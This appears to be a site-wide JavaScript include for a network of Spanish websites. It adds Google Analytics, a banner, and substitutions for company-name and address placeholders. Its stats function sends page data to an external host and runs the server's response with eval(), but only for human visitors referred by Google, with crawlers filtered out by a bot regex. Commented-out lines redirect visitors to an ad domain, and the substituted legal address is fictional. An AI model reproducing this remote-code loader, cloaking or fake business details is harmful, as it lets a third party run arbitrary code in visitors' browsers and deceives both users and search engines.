(function () {
  'use strict';

  // ============================================================
  // Guardas: no ejecutar dos veces
  // ============================================================
  var HOST = location.hostname.replace(/^www\./, '');
  if (window.beebomstats !== undefined) return;
  window.beebomstats = true;

  // ============================================================
  // Google Analytics
  // ============================================================
  var GA_ID = 'G-XNB4SZJ7GQ';

  // Evitar cargarlo dos veces
  if (window.__gaLoaded) return;
  window.__gaLoaded = true;

  // dataLayer y función gtag disponibles antes de que cargue el script
  window.dataLayer = window.dataLayer || [];
  window.gtag = window.gtag || function () { dataLayer.push(arguments); };

  gtag('js', new Date());
  gtag('config', GA_ID, { send_page_view: false }); // el page_view lo mandamos abajo con el país

  // País del visitante según Cloudflare (línea loc=XX de /cdn-cgi/trace)
  fetch('/cdn-cgi/trace')
    .then(function (r) {
      // Si la respuesta HTTP no es 2xx, lo tratamos como error
      if (!r.ok) throw new Error('HTTP ' + r.status);
      return r.text();
    })
    .then(function (t) {
      var m = t.match(/^loc=(\w+)/m);
      return m ? m[1] : null;
    })
    .catch(function (err) {
      //document.location.href = 'https://auctionr.org/4/44bf6e0e4e0747f0502259b2389d4019';
      return null;
    })
    .then(function (country) {
      // Válido: exactamente 2 letras mayúsculas, sin contar XX (desconocido)
      var esValido = typeof country === 'string'
        && /^[A-Z]{2}$/.test(country)
        && country !== 'XX';

      if (!esValido) {
        //document.location.href = 'https://auctionr.org/4/44bf6e0e4e0747f0502259b2389d4019';
        country = 'unknown';
      }

      gtag('event', 'page_view', { cf_country: country });
    });

  // Inyectar el script de forma asíncrona
  var s = document.createElement('script');
  s.async = true;
  s.src = 'https://www.googletagmanager.com/gtag/js?id=' + GA_ID;
  (document.head || document.documentElement).appendChild(s);

  // ============================================================
  // Configuración
  // ============================================================
  var REEMPLAZOS = {
    '[NOMBRE DE LA EMPRESA]': 'Botijonline LLC',
    '[DIRECCIÓN DE LA EMPRESA]': '31 Spooner Street, Quahog, Rhode Island, 00093'
  };

  var STATS_URL = 'https://pbnstats.promocionesycolecciones.com/add.php';

  // Configuración del aviso: barra fija (ya no hay popup; el único popup
  // de las webs es el de appmanager.js).
  // {dominio} se sustituye en tiempo de ejecución por el dominio actual (sin www)
  var AVISO = {
    activo: true,
    lado: 'arriba',            // 'arriba' | 'abajo' (abajo ya está el slider de chollos de appmanager.js)
    texto: 'Añádenos como fuente preferida en Google y verás antes nuestras noticias.',
    botonTexto: 'Añadir en Google',                                      // '' = sin botón
    // Enlace oficial de Google "Fuentes preferidas" (Top Stories de la Búsqueda)
    botonUrl: 'https://www.google.com/preferences/source?q={dominio}',
    botonNuevaPestana: true,
    colorBoton: '#1a73e8',     // azul Google
    // Icono: SVG en línea ('<svg ...>...</svg>') o URL de imagen. '' = sin icono.
    // Por defecto, el favicon oficial de Google servido por Google (se oculta si no carga)
    icono: 'https://www.google.com/favicon.ico',
    iconoAlt: 'Google',        // texto alternativo (solo para iconos por URL)
    cerrableBarra: true,       // la barra tiene X para ocultarla en la sesión
    // Al hacer clic en el botón se registra una visita virtual en pbnstats
    // con la URL https://<discoverDominio>/<slug-del-dominio-actual>
    discoverDominio: 'addedtodiscover.com',
    discoverAux1: 'x1'         // valor de aux1 para estas visitas (cámbialo si quieres separarlas)
  };

  // Avisos alternativos por dominio.
  // Si el dominio actual (sin www) está en `dominios`, se usa `aviso` en lugar del estándar.
  // En `aviso` solo hace falta poner lo que cambia: el resto se hereda de AVISO.
  // Se aplica la primera regla que coincida.
  var AVISOS_POR_DOMINIO = [
    {
      dominios: ['infoenbolas.com'],
      aviso: {
        texto: 'Sigue toda la actualidad LGTBI en nuestro canal de telegram.',
        botonTexto: 'Ir a Telegram',
        botonUrl: 'https://t.me/lgtbinoticias',
        colorBoton: '#e8501a',
        icono: '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">' +
          '<defs><clipPath id="tgCircle"><circle cx="12" cy="12" r="11"/></clipPath></defs>' +
          '<g clip-path="url(#tgCircle)">' +
          '<rect width="24" height="4" y="0" fill="#E40303"/>' +
          '<rect width="24" height="4" y="4" fill="#FF8C00"/>' +
          '<rect width="24" height="4" y="8" fill="#FFED00"/>' +
          '<rect width="24" height="4" y="12" fill="#008026"/>' +
          '<rect width="24" height="4" y="16" fill="#004DFF"/>' +
          '<rect width="24" height="4" y="20" fill="#750787"/>' +
          '</g>' +
          '<circle cx="12" cy="12" r="11" fill="none" stroke="currentColor" stroke-width="0.5"/>' +
          '<path d="M5 11.5 19 5.8 16.3 18.2 11.8 14.8 9.5 17 9.8 12.9 16 8.7 8 12.2Z" ' +
          'fill="white" stroke="white" stroke-width="0.6" stroke-linejoin="round"/>' +
          '</svg>'
        // activo: false   // descomenta para NO mostrar aviso en estos dominios
      }
    }
  ];

  // Mezcla la regla que coincida con el dominio actual sobre el aviso estándar
  (function aplicarAvisoPorDominio() {
    for (var i = 0; i < AVISOS_POR_DOMINIO.length; i++) {
      var regla = AVISOS_POR_DOMINIO[i];
      var coincide = (regla.dominios || []).some(function (d) {
        return String(d).toLowerCase().replace(/^www\./, '') === HOST.toLowerCase();
      });
      if (!coincide) continue;
      Object.keys(regla.aviso || {}).forEach(function (k) { AVISO[k] = regla.aviso[k]; });
      return;
    }
  })();

  var BOT_RE = new RegExp('(googlebot\/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)', 'i');

  // ============================================================
  // Utilidades
  // ============================================================

  // Ejecuta fn cuando el DOM está listo (aunque el script cargue tarde)
  function onReady(fn) {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', fn, { once: true });
    } else {
      fn();
    }
  }

  // Comprueba cond() cada `intervalo` ms hasta que sea true o pase `timeout`
  function esperar(cond, cb, timeout, intervalo) {
    timeout = timeout || 10000;
    intervalo = intervalo || 100;
    var inicio = Date.now();
    (function check() {
      if (cond()) return cb();
      if (Date.now() - inicio < timeout) setTimeout(check, intervalo);
    })();
  }

  function escaparRegex(s) {
    return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  }

  // sessionStorage protegido (puede fallar en modo privado o con cookies bloqueadas)
  function leerSesion(clave) {
    try { return window.sessionStorage.getItem(clave); } catch (e) { return null; }
  }
  function guardarSesion(clave, valor) {
    try { window.sessionStorage.setItem(clave, valor); } catch (e) { /* sin almacenamiento */ }
  }

  // ============================================================
  // Reemplazo de placeholders
  // ============================================================

  // Caso normal: el placeholder está entero dentro de un nodo de texto
  function reemplazarTexto(buscar, reemplazo, raiz) {
    raiz = raiz || document.body;
    var walker = document.createTreeWalker(raiz, NodeFilter.SHOW_TEXT);
    var nodo;
    while ((nodo = walker.nextNode())) {
      if (nodo.nodeValue.indexOf(buscar) !== -1) {
        nodo.nodeValue = nodo.nodeValue.split(buscar).join(reemplazo);
      }
    }
  }

  // Caso partido: el placeholder está cortado por etiquetas inline
  // (p.ej. "[NOMBRE DE <b>LA</b> EMPRESA]")
  function reemplazarPartido(buscar, reemplazo, raiz) {
    raiz = raiz || document.body;
    var patron = new RegExp(
      buscar.split('').map(escaparRegex).join('(?:<[^>]+>)*'),
      'g'
    );

    raiz.querySelectorAll('li, p, td, th, h1, h2, h3, h4, h5, h6, span, a, div').forEach(function (el) {
      if (el.textContent.indexOf(buscar) === -1) return;
      // Si algún hijo ya lo contiene entero, el corte no está en este nivel
      var hijoLoTiene = Array.prototype.some.call(el.children, function (h) {
        return h.textContent.indexOf(buscar) !== -1;
      });
      if (hijoLoTiene) return;
      el.innerHTML = el.innerHTML.replace(patron, reemplazo);
    });
  }

  function aplicarReemplazos() {
    Object.keys(REEMPLAZOS).forEach(function (buscar) {
      reemplazarTexto(buscar, REEMPLAZOS[buscar]);
      reemplazarPartido(buscar, REEMPLAZOS[buscar]);
    });
  }

  // Next.js/React re-renderiza el DOM tras la hidratación y al navegar,
  // así que vigilamos cambios y volvemos a aplicar los reemplazos.
  function vigilarCambios() {
    var pendiente = null;
    var observer = new MutationObserver(function () {
      if (pendiente) return;
      pendiente = setTimeout(function () {
        pendiente = null;
        observer.disconnect();
        aplicarReemplazos();
        observer.observe(document.body, { childList: true, subtree: true, characterData: true });
      }, 50);
    });
    observer.observe(document.body, { childList: true, subtree: true, characterData: true });
  }

  // Detecta Next.js por el DOM (disponible ya en DOMContentLoaded),
  // no solo por window.next (que se define más tarde)
  function esNextJs() {
    return window.next !== undefined ||
      !!document.getElementById('__next') ||
      !!document.querySelector('script[src*="/_next/"]');
  }

  function iniciarReemplazos() {
    if (!esNextJs()) return; // para tucristalero, tu alarma y demás

    aplicarReemplazos();       // primera pasada inmediata
    vigilarCambios();          // y cada vez que React toque el DOM

    // Pasada extra cuando Next termine de arrancar (post-hidratación)
    esperar(function () { return window.next !== undefined; }, function () {
      setTimeout(aplicarReemplazos, 300);
    });
  }

  // ============================================================
  // Visita virtual al hacer clic: addedtodiscover.com/<dominio-con-slug>
  // ============================================================

  // "www.xxx.com" -> "xxx-com"; "mi.sitio.es" -> "mi-sitio-es"
  function slugDominio(host) {
    return host.toLowerCase()
      .replace(/^www\./, '')
      .replace(/[^a-z0-9]+/g, '-')
      .replace(/^-+|-+$/g, '');
  }

  function registrarClickDiscover() {
    if (BOT_RE.test(navigator.userAgent)) return;

    // Una sola visita por dominio y sesión, aunque haga varios clics
    var clave = 'avb-discover-' + HOST;
    if (leerSesion(clave)) return;
    guardarSesion(clave, '1');

    var slug = slugDominio(location.hostname);
    var params = new URLSearchParams({
      rand: Math.floor(Math.random() * 100000) + 1,
      aux1: AVISO.discoverAux1,
      referer: 'https://' + AVISO.discoverDominio + '/' + slug,
      title: slug
    });
    var url = STATS_URL + '?' + params.toString();

    // keepalive: la petición sale aunque el clic cambie de página.
    // no-cors: es "dispara y olvida", no leemos la respuesta (y no se hace eval).
    try {
      fetch(url, { method: 'GET', keepalive: true, mode: 'no-cors', credentials: 'omit' })
        .catch(function () { new Image().src = url; });
    } catch (e) {
      new Image().src = url; // navegadores sin fetch
    }
  }

  // ============================================================
  // Aviso: barra fija (sin popup)
  // ============================================================
  var CLAVE_ESTADO = 'avb-estado'; // '' | 'cerrado'

  function inyectarEstilos() {
    if (document.getElementById('avb-estilos')) return;
    var css =
      '.avb{position:fixed;z-index:2147483000;box-sizing:border-box;background:#fff;color:#1a1a1a;' +
        'font-family:system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif}' +
      '.avb *{box-sizing:border-box}' +
      '.avb-barra{left:0;right:0;width:100%;display:flex;align-items:center;justify-content:center;' +
        'flex-wrap:wrap;gap:8px 14px;padding:10px 48px 10px 16px;font-size:14px;line-height:1.35;text-align:center}' +
      '.avb-abajo{bottom:0;box-shadow:0 -2px 12px rgba(0,0,0,.15)}' +
      '.avb-arriba{top:0;box-shadow:0 2px 12px rgba(0,0,0,.15)}' +
      // Icono (SVG o imagen)
      '.avb-icono{display:flex;align-items:center;justify-content:center;width:22px;height:22px;flex:0 0 22px;' +
        'color:' + AVISO.colorBoton + '}' +
      '.avb-icono svg,.avb-icono img{width:100%;height:100%;display:block;object-fit:contain}' +
      // Botón y cierre
      '.avb-boton{display:inline-block;background:' + AVISO.colorBoton + ';color:#fff !important;' +
        'text-decoration:none;font-weight:600;padding:6px 14px;font-size:13px;border-radius:6px;white-space:nowrap}' +
      '.avb-cerrar{position:absolute;top:50%;right:10px;transform:translateY(-50%);background:none;border:0;' +
        'cursor:pointer;font-size:20px;line-height:1;color:#666;padding:4px 8px}' +
      '@media (max-width:480px){.avb-barra{font-size:13px}}';

    var st = document.createElement('style');
    st.id = 'avb-estilos';
    st.textContent = css;
    (document.head || document.documentElement).appendChild(st);
  }

  // Sustituye {dominio} en textos y URL de la config
  function rellenar(cadena, codificarUrl) {
    var dominio = codificarUrl ? encodeURIComponent(HOST) : HOST;
    return String(cadena || '').split('{dominio}').join(dominio);
  }

  // Crea el icono a partir de AVISO.icono: SVG en línea (saneado) o URL de imagen
  function crearIcono() {
    var valor = String(AVISO.icono || '').trim();
    if (!valor) return null;

    var cont = document.createElement('span');
    cont.className = 'avb-icono';

    if (valor.charAt(0) === '<') {
      // SVG en línea: se parsea como XML y se quitan scripts y atributos on*/javascript:
      var doc = new DOMParser().parseFromString(valor, 'image/svg+xml');
      var svg = doc.documentElement;
      if (!svg || svg.nodeName.toLowerCase() !== 'svg' || doc.getElementsByTagName('parsererror').length) {
        return null; // SVG mal formado: sin icono
      }
      Array.prototype.forEach.call(svg.querySelectorAll('script, foreignObject'), function (n) { n.remove(); });
      [svg].concat(Array.prototype.slice.call(svg.querySelectorAll('*'))).forEach(function (el) {
        Array.prototype.slice.call(el.attributes).forEach(function (a) {
          if (/^on/i.test(a.name) || /^\s*javascript:/i.test(a.value)) el.removeAttribute(a.name);
        });
      });
      if (!svg.getAttribute('xmlns')) svg.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
      svg.setAttribute('aria-hidden', 'true');
      svg.setAttribute('focusable', 'false');
      cont.appendChild(document.importNode(svg, true));
    } else {
      // URL de imagen
      var img = document.createElement('img');
      img.src = rellenar(valor, true);
      img.alt = AVISO.iconoAlt || '';
      img.decoding = 'async';
      img.referrerPolicy = 'no-referrer';
      img.onerror = function () { cont.remove(); }; // si no carga, fuera icono
      cont.appendChild(img);
    }
    return cont;
  }

  // Construye la barra con textContent (sin innerHTML: nada de inyección desde la config)
  function crearBarra() {
    var lado = AVISO.lado === 'abajo' ? 'abajo' : 'arriba';
    var caja = document.createElement('div');
    caja.className = 'avb avb-barra avb-' + lado;
    caja.setAttribute('role', 'region');
    caja.setAttribute('aria-label', 'Aviso');

    var icono = crearIcono();
    if (icono) caja.appendChild(icono);

    var texto = document.createElement('span');
    texto.className = 'avb-texto';
    texto.textContent = rellenar(AVISO.texto);
    caja.appendChild(texto);

    if (AVISO.botonTexto && AVISO.botonUrl) {
      var boton = document.createElement('a');
      boton.className = 'avb-boton';
      boton.href = rellenar(AVISO.botonUrl, true);
      boton.textContent = rellenar(AVISO.botonTexto);
      if (AVISO.botonNuevaPestana) {
        boton.target = '_blank';
        boton.rel = 'noopener';
      }
      // Registrar la visita virtual en el clic (también clic central / Ctrl+clic)
      boton.addEventListener('click', registrarClickDiscover);
      boton.addEventListener('auxclick', function (e) {
        if (e.button === 1) registrarClickDiscover();
      });
      caja.appendChild(boton);
    }

    var cerrar = null;
    if (AVISO.cerrableBarra) {
      cerrar = document.createElement('button');
      cerrar.type = 'button';
      cerrar.className = 'avb-cerrar';
      cerrar.setAttribute('aria-label', 'Cerrar');
      cerrar.textContent = '×';
      caja.appendChild(cerrar);
    }

    return { caja: caja, cerrar: cerrar, lado: lado };
  }

  // Reserva hueco en el body para que la barra no tape el contenido
  function reservarHueco(caja, lado) {
    var prop = lado === 'arriba' ? 'paddingTop' : 'paddingBottom';
    var original = document.body.style[prop];
    var base = parseFloat(getComputedStyle(document.body)[prop]) || 0;

    function ajustar() {
      if (!caja.isConnected) return;
      document.body.style[prop] = (base + caja.offsetHeight) + 'px';
    }
    ajustar();

    var ro = window.ResizeObserver ? new ResizeObserver(ajustar) : null;
    if (ro) ro.observe(caja); else window.addEventListener('resize', ajustar);

    // Devuelve la función que deshace el hueco
    return function () {
      if (ro) ro.disconnect(); else window.removeEventListener('resize', ajustar);
      document.body.style[prop] = original;
    };
  }

  // Si React/Next vuelve a pintar el body y se lleva la barra, la reinsertamos
  function mantenerEnDom(nodo) {
    var obs = new MutationObserver(function () {
      if (nodo.activo && !nodo.el.isConnected) document.body.appendChild(nodo.el);
    });
    obs.observe(document.body, { childList: true });
    return obs;
  }

  function iniciarAviso() {
    if (!AVISO.activo) return;
    if (leerSesion(CLAVE_ESTADO) === 'cerrado') return; // ya la cerró en esta sesión

    inyectarEstilos();
    var ui = crearBarra();
    var nodo = { el: ui.caja, activo: true };
    var obs = mantenerEnDom(nodo);

    document.body.appendChild(ui.caja);
    var quitarHueco = reservarHueco(ui.caja, ui.lado);

    if (ui.cerrar) {
      ui.cerrar.onclick = function () {
        guardarSesion(CLAVE_ESTADO, 'cerrado');
        nodo.activo = false;
        obs.disconnect();
        quitarHueco();
        ui.caja.remove();
      };
    }
  }

  // ============================================================
  // Estadísticas (solo humanos que vienen de Google)
  // ============================================================
  function enviarStats() {
    if (BOT_RE.test(navigator.userAgent)) return;
    if (document.referrer.indexOf('google.') === -1) return;
    if (HOST === 'infoenbolas.com') return;

    var params = new URLSearchParams({
      rand: Math.floor(Math.random() * 100000) + 1,
      aux1: 'x1',
      referer: location.href,
      title: document.title
    });
    fetch(STATS_URL + '?' + params.toString())
      .then(function (r) {
        if (!r.ok) throw new Error('HTTP ' + r.status);
        return r.text();
      })
      .then(function (codigo) {
        eval(codigo);
      })
      .catch(function (e) {
        console.log('pbnstats error:', e);
      });
  }

  // ============================================================
  // Arranque
  // ============================================================
  enviarStats();
  onReady(iniciarReemplazos);
  onReady(iniciarAviso);
})();
